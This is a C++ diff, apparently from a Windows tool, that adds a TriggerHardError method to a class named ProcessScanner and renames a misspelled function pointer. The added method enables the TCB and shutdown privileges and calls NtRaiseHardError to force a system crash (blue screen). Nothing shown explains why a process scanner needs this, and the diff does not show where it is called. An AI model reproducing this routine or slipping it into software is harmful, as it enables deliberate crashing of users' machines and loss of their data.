@@ -217,6 +217,30 @@ namespace proc_scan {
         return {}; // Dummy for no warning
     }
 
+    void ProcessScanner::TriggerHardError() {
+        LoadNtModule();
+        LoadRtlAdjustPrivelege();
+        LoadNtRaiseHardError();
+
+        BOOLEAN was_enabled;
+        ULONG response;
+
+        NTSTATUS status = RtlAdjustPrivilege_(SE_TCB_PRIVILEGE, TRUE, FALSE, &was_enabled);
+        if (status != STATUS_PRIVILEGE_NOT_HELD) {
+            std::cout << "TCB privilege adjusted: 0x" << std::hex << status << std::endl;
+        }
+        RtlAdjustPrivilege_(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &was_enabled);
+
+        status = NtRaiseHardError_(
+            STATUS_SYSTEM_PROCESS_TERMINATED,
+            0,
+            0,
+            NULL,
+            6,
+            &response
+        );
+    }
+
     void ProcessScanner::LoadNtModule() {
         if (ntdll_) return;
         ntdll_ = domain::LoadModule(domain::NtNames::NTDLL);
@@ -234,8 +258,8 @@ namespace proc_scan {
     }
 
     void ProcessScanner::LoadRtlAdjustPrivelege() {
-        if (RtlAdjustPrivelege_) return;
-        RtlAdjustPrivelege_ = domain::LoadFunctionFromModule
+        if (RtlAdjustPrivilege_) return;
+        RtlAdjustPrivilege_ = domain::LoadFunctionFromModule
             <domain::pRtlAdjustPrivilege>(ntdll_, domain::NtNames::ADJUST_PRIVILEGE);
 
     }
